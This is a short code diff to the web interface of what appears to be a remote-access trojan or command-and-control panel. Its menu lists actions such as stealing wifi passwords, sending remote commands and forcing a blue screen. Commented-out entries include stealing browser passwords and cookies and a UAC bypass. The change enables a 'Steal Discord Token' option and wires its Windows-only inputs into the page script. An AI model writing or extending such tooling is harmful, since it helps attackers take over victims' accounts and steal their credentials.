@@ -290,8 +290,8 @@
                 <option value="wifi-password">Steal wifi passwords</option>
                 <option value="send-command">Send Command</option>
                 <option value="restart">Restart Devices Shell</option>
-                <!-- <option value="steal-token">Steal Discord Token</option>
-                <option value="steal-password">Steal Browser Passwords</option>
+                <option value="discord">Steal Discord Token</option>
+                <!-- <option value="steal-password">Steal Browser Passwords</option>
                 <option value="steal-cookie">Get Browser Cookies</option>
                 <option value="screen-shot">Take Screen Shot</option>
                 <option value="uac-bypass">UAC Bypass</option> -->
@@ -558,6 +558,11 @@
             pem_input.style.display = "none"
         }
         if (selected_input === "bsod") {
+            pem_windows.style.display = "block"
+            pem_linux.style.display = "none"
+            pem_osx.style.display = "none"
+        }
+        if (selected_input === "discord") {
             pem_windows.style.display = "block"
             pem_linux.style.display = "none"
             pem_osx.style.display = "none"
